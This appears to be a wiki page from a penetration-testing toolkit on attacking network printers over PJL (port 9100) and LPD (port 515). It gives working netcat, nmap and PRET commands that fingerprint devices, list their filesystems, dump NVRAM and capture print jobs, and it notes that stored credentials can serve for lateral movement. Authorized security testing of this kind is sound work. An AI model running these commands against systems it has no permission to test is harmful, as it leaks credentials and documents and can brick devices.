---
service: print
title: Network Print Services (JetDirect / PJL / LPD)
ports: 9100, 515
aliases: jetdirect, pdl-datastream, lpd, printer
---

# Network print — quick wins

**When you see it:** 9100/tcp (raw/JetDirect/PJL) or 515/tcp (LPD) open → a network printer or
print server. PJL over 9100 exposes a filesystem, NVRAM, and captured print jobs — no auth.
PRET (Printer Exploitation Toolkit) automates the abuse. aranum's dispatcher is
two-evidence-guarded and reports model + PJL filesystem follow-up hints.

> Authorized testing only. Triage is read-only. PJL filesystem writes / NVRAM changes / job
> capture (marked ✏️) alter device state — get sign-off; some PJL commands can brick or reset
> a printer.

## Triage (read-only)
```sh
nc -nv -w 5 H 9100                                    # raw port reachable
{ printf '\x1b%%-12345X@PJL INFO ID\r\n@PJL INFO STATUS\r\n\x1b%%-12345X'; sleep 2; } | nc -w5 H 9100
nmap -sV --script pjl-ready-message -p 9100 H          # model / ready message
nc -nv -w 5 H 515                                       # LPD reachable
```

## Quick wins

### PJL device fingerprint + filesystem listing
```sh
python3 pret.py H pjl        # then: id / info status / fsdirlist / ls
# raw equivalent for a directory listing:
{ printf '\x1b%%-12345X@PJL FSDIRLIST NAME="0:\\" ENTRY=1 COUNT=999\r\n\x1b%%-12345X'; sleep 2; } | nc -w5 H 9100
```
*Why:* PJL exposes an on-device filesystem (`0:`, `1:`) with no auth — it stores fonts, macros,
saved jobs, and sometimes address books / stored credentials. `FSDIRLIST` walks it read-only.

### Capture / read print jobs ✏️
```sh
python3 pret.py H pjl        # then: nvram dump / capture
```
*Why:* PRET's `capture`/`nvram dump` can grab spooled documents and NVRAM (which may hold Wi-Fi
PSKs, LDAP bind creds for scan-to-folder, and admin PINs) — high-value data leakage from an
unauthenticated device.

### LPD queue enumeration
```sh
{ printf '\x03default\n'; sleep 2; } | nc -w5 H 515     # send-queue-state (short)
```
*Why:* the LPD protocol answers queue-state requests, revealing queued jobs and the print
server's job handling — recon on what's being printed and by whom.

## aranum helpers
- `aranumtoolkit/network/enum-print.sh` — dispatcher (JetDirect/PJL 9100 + LPD 515, two-evidence-guarded; device model + PJL filesystem follow-up hints).
- See `wiki/ipp.md` for IPP/CUPS (631) on the same device.

## Gotchas
- The dispatcher requires two independent evidence signals before emitting a hit — printers share 9100 with other raw-socket services, so single-signal matches are suppressed.
- PJL `FSINIT` / NVRAM writes can factory-reset or brick a printer — stay on `FSDIRLIST`/`FSUPLOAD` (read) unless sign-off covers destructive commands.
- Many printers rate-limit or drop idle 9100 connections fast — send the PJL UEL (`\x1b%-12345X`) wrapper and read promptly.
- Scan-to-folder / LDAP creds in NVRAM often reuse a domain service account — a strong AD pivot.

## Sources
- PRET (Printer Exploitation Toolkit, RUB-SysSec); HP PJL Technical Reference; HackTricks `9100-pjl` / printer hacking; aranum ROADMAP-001 I-K.
